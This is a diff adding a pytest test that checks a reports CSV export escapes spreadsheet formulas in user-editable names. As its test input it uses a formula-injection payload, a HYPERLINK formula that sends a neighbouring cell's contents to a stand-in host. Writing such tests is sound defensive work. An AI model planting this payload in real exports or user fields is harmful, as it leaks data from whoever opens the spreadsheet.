@@ -344,3 +344,19 @@ def test_reports_export_csv_requires_permission(client, db_session, login_as):
     user = _user(db_session, "PlainCsv")
     login_as(client, user.id)
     assert client.get("/reports/export.csv", follow_redirects=False).status_code == 403
+
+
+def test_csv_export_neutralises_formulas(client, db_session, login_as):
+    # Display names are user-editable: a formula must reach Excel as text.
+    import csv
+    import io
+
+    bronze = _plan(db_session, "bronze")
+    admin = _manager(db_session, "CsvAdmin", role=Role.admin)
+    evil = _user(db_session, '=HYPERLINK("http://x/?"&B2,"click")')
+    _paid_renewal(db_session, _sub(db_session, evil, bronze, datetime(2026, 6, 20)),
+                  bronze, 500, datetime(2026, 6, 5))
+    login_as(client, admin.id)
+    rows = list(csv.reader(io.StringIO(client.get("/reports/export.csv").text)))
+    assert rows[1][1] == "'" + evil.real_name
+    assert rows[1][3] == "5.00"  # numbers untouched
